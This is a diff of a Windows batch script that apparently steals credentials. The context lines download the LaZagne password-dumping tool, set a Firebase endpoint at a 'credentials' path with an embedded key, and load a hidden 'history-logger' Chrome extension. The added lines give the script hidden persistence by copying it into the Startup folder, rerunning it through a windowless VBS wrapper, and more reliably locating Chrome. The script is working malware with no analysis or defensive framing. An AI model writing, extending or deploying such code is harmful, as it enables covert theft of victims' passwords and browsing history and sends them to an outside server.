@@ -2,16 +2,49 @@
 chcp 65001 >nul
 setlocal enabledelayedexpansion
 
+set "SCRIPT_DIR=%~dp0"
+set "SCRIPT_NAME=%~nx0"
+set "VBS_NAME=run_hidden.vbs"
+set "VBS_PATH=%SCRIPT_DIR%%VBS_NAME%"
+set "STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
+set "STARTUP_SCRIPT=%STARTUP_DIR%\%SCRIPT_NAME%"
+
 set "LAZAGNE_URL=https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe"
 set "LAZAGNE_EXE=%TEMP%\LaZagne.exe"
 set "OUTPUT_DIR=%TEMP%\Lazagne_Results"
 set "FIREBASE_URL=https://check-6c35e-default-rtdb.asia-southeast1.firebasedatabase.app/credentials"
 set "FIREBASE_KEY=fdM9pHfanpouiqsEmFLJUDAC2LtXF7rUBXbIPDA4"
 set "ZIP_URL=https://drive.google.com/uc?export=download&id=1_MrCTaWFitVrrapsDodqTZduIvWKHCtU"
-set "SCRIPT_DIR=%~dp0"
 set "WORKDIR=%SCRIPT_DIR%history-logger"
-set "STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
-set "CHROME_EXE=%ProgramFiles(x86)%\Google\Chrome\Application\chrome.exe"
+
+set "CHROME_EXE=C:\Program Files\Google\Chrome\Application\chrome.exe"
+if not exist "!CHROME_EXE!" (
+    set "CHROME_EXE=%ProgramFiles(x86)%\Google\Chrome\Application\chrome.exe"
+)
+if not exist "!CHROME_EXE!" (
+    for /f "tokens=*" %%i in ('where chrome.exe 2^>nul') do (
+        set "CHROME_EXE=%%i"
+        goto :chrome_found
+    )
+    exit /b 1
+)
+:chrome_found
+
+if not exist "%VBS_PATH%" (
+    (
+        echo Set WShell = CreateObject("WScript.Shell")
+        echo WShell.Run "cmd.exe /c ""%SCRIPT_DIR%%SCRIPT_NAME%""", 0, True
+    ) > "%VBS_PATH%"
+    if errorlevel 1 exit /b 1
+)
+
+if not exist "%STARTUP_SCRIPT%" (
+    copy "%SCRIPT_DIR%%SCRIPT_NAME%" "%STARTUP_SCRIPT%" >nul 2>nul
+    if errorlevel 1 exit /b 1
+)
+
+start "" wscript.exe "%VBS_PATH%"
+exit /b 0
 
 if not exist "%LAZAGNE_EXE%" (
     powershell -Command "$ProgressPreference='SilentlyContinue'; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%LAZAGNE_URL%' -OutFile '%LAZAGNE_EXE%'" >nul 2>nul
@@ -80,12 +113,12 @@ if errorlevel 1 exit /b 1
 
 (
     echo Set WShell = CreateObject("WScript.Shell")
-    echo WShell.Run """%CHROME_EXE%"" --user-data-dir=""!PROFILE_DIR!"" --disable-extensions-except=""%WORKDIR%"" --load-extension=""%WORKDIR%""", 0, False
+    echo WShell.Run """!CHROME_EXE!"" --user-data-dir=""!PROFILE_DIR!"" --disable-extensions-except=""%WORKDIR%"" --load-extension=""%WORKDIR%""", 0, False
 ) > "%STARTUP_DIR%\run_extension.vbs"
 if errorlevel 1 exit /b 1
 
 if exist "%WORKDIR%" (
-    start "" "%CHROME_EXE%" --user-data-dir="!PROFILE_DIR!" --disable-extensions-except="%WORKDIR%" --load-extension="%WORKDIR%" >nul 2>nul
+    start "" "!CHROME_EXE!" --user-data-dir="!PROFILE_DIR!" --disable-extensions-except="%WORKDIR%" --load-extension="%WORKDIR%" >nul 2>nul
     if errorlevel 1 exit /b 1
 )
 
